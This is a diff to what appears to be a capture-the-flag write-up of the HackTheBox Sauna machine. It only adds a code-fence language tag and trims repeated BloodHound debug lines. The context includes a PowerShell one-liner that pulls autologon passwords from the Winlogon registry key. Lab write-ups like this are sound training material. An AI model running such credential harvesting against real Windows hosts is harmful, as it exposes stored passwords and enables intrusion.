@@ -131,7 +131,7 @@ we want to get **remote code execution** on the box, so we try **PowerShell Remo
 *Looking around the box in the user profile and in the root directory,* we don't see much intersting information. *However, when we check for autlogon creds,* we do find interesting credentials for the `svc_loanmgr` user:
 
 My **PowerShell one-liner**:
-```
+```powershell
 $ErrorActionPreference='SilentlyContinue';'DefaultDomainName', 'DefaultUserName', 'DefaultPassword', 'AltDefaultDomainName', 'AltDefaultUserName', 'AltDefaultPassword' | % {$Val = Get-ItemPropertyValue -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name $_ ;if($Val){Write-Host -ForegroundColor Green "[+] $_`: $Val"; Clear-Variable Val}else{Write-Host "[-] $_`: Not found"}}
 ```
 
@@ -192,15 +192,6 @@ DEBUG: Querying resolver LDAP for SID S-1-5-21-2966785786-3096785034-1186376766-
 INFO: Found 0 trusts
 DEBUG: Finished writing domain info
 INFO: Starting computer enumeration with 10 workers
-DEBUG: Start working
-DEBUG: Start working
-DEBUG: Start working
-DEBUG: Start working
-DEBUG: Start working
-DEBUG: Start working
-DEBUG: Start working
-DEBUG: Start working
-DEBUG: Start working
 DEBUG: Start working
 INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
 DEBUG: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
